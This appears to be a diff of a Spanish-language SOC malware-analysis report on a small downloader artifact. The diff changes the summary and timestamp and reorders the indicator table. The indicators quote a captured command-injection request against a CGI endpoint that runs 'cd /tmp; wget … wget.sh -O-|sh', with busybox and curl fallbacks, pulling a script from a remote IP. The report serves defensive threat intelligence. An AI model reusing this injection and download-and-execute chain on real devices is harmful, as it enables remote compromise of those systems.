@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 295 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:42:54+00:00`
+- **Registrado:** `2026-08-09T19:42:54.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,11 +52,11 @@ GET /cgi-bin/downloadFlile.cgi?name=%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wg
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.175.XXX | static_analysis |
-| ip | 91.92.40.XXX | static_analysis |
 | url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20toto5%60 | strings |
-| hash | 95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9 | static_analysis |
+| ip | 91.92.40.XXX | static_analysis |
+| ip | 190.179.175.XXX | static_analysis |
 | command | GET /cgi-bin/downloadFlile.cgi?name=%60cd%20/tmp%3Bwget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20toto5%3Bbusybox% | strings |
+| hash | 95c9e7890991fd9a3cfc866f86a6513a0a812cdbcfd407b5e90b22d990ab9be9 | static_analysis |
 | ip | 45.156.87.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
